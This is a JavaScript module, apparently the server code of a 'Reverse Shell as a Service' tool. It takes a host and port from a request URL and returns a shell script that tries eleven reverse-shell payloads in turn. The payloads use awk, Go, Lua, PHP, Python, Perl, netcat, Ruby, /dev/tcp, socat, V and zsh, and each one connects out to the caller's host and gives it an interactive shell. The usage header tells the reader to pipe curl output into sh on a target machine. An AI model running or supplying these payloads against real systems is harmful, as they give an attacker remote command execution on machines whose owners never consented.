'use strict';

const usage = `# Reverse Shell as a Service
# https://github.com/lukechilds/reverse-shell
#
# 1. On your machine:
#      nc -l 1337
#
# 2. On the target machine:
#      curl https://reverse-shell.sh/yourip:1337 | sh
#
# 3. Don't be a dick`;

const generateScript = (host, port) => {
	const payloads = {
		awk: `awk 'BEGIN {s = "/inet/tcp/0/${host}/${port}"; while(42) { do{ printf "shell>" |& s; s |& getline c; if(c){ while ((c |& getline) > 0) print $0 |& s; close(c); } } while(c != "exit") close(s); }}' /dev/null`,
		go: `echo 'package main;import"os/exec";import"net";func main(){c,_:=net.Dial("tcp","${host}:${port}");cmd:=exec.Command("sh");cmd.Stdin=c;cmd.Stdout=c;cmd.Stderr=c;cmd.Run()}' > /tmp/t.go && go run /tmp/t.go && rm /tmp/t.go`,
		lua: `: lua -e "require('socket');require('os');t=socket.tcp();t:connect(${host},${port});os.execute('sh -i <&3 >&3 2>&3');"`,
		php: `php -r '$sock=fsockopen("${host}",${port});exec("sh <&3 >&3 2>&3");'`,
		python: `python -c 'import socket,subprocess,os; s=socket.socket(socket.AF_INET,socket.SOCK_STREAM); s.connect(("${host}",${port})); os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2); p=subprocess.call(["/bin/sh","-i"]);'`,
		perl: `perl -e 'use Socket;$i="${host}";$p=${port};socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'`,
		nc: `: rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc ${host} ${port} >/tmp/f`,
		ruby: `ruby -rsocket -e'exit if fork;c=TCPSocket.new("${host}","${port}");loop{c.gets.chomp!;(exit! if $_=="exit");($_=~/cd (.+)/i?(Dir.chdir($1)):(IO.popen($_,?r){|io|c.print io.read}))rescue c.puts "failed: #{$_}"}'`,
		sh: `/bin/sh -i >& /dev/tcp/${host}/${port} 0>&1`,
		socat: `socat TCP:${host}:${port} EXEC:sh`,
		v: `echo 'import os' > /tmp/t.v && echo 'fn main() { os.system("nc -e sh ${host} ${port} 0>&1") }' >> /tmp/t.v && v run /tmp/t.v && rm /tmp/t.v`,
		zsh: `zsh -c 'zmodload zsh/net/tcp && ztcp ${host} ${port} && zsh >&$REPLY 2>&$REPLY 0>&$REPLY'`
	};

	return Object.entries(payloads).reduce((script, [cmd, payload]) => {
		script += `

if command -v ${cmd} > /dev/null 2>&1; then
	${payload}
	exit;
fi`;

		return script;
	}, '');
};

const reverseShell = req => {
	const [host, port] = req.url.substr(1).split(':');
	return usage + (host && port && generateScript(host, port));
};

module.exports = reverseShell;
